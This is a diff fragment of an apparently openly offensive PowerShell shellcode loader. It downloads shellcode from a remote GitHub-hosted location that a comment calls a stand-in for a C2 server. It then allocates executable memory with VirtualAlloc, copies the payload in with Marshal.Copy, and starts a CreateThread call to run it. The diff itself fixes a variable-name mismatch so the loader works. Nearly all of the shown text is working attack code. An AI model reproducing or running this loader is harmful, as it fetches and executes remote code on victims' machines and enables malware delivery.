@@ -13,7 +13,7 @@ $server = https://github.com/crzyscholar/wherever_I_store_the_shellcode
 $port = 8080 # this doesn't really apply here, I'm getting the shellcode from github not c2 server
 
 $response = Invoke-WebRequest -uri "$server:$port/shellcode" -UseBasicParsing
-$bytes = $response.Content
+$Bytes = $response.Content
 
 $VirtualAlloc = @"
 using System;
@@ -29,7 +29,7 @@ public class Kernel32 {
 $Kernel32 = Add-Type -MemberDefinition $VirtualAlloc -Name "Kernel32" -Namespace Win32 -passThru
 $Buffer = $Kernel32::VirtualAlloc([IntPtr]::Zero, $Bytes.Length, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE and PAGE_EXECUTE_READWRITE 
 
-[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $Buffer, $bytes.Length) # https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-9.0
+[System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Buffer, $Bytes.Length) # https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-9.0
 
 $CreateThread = @"
 using System;
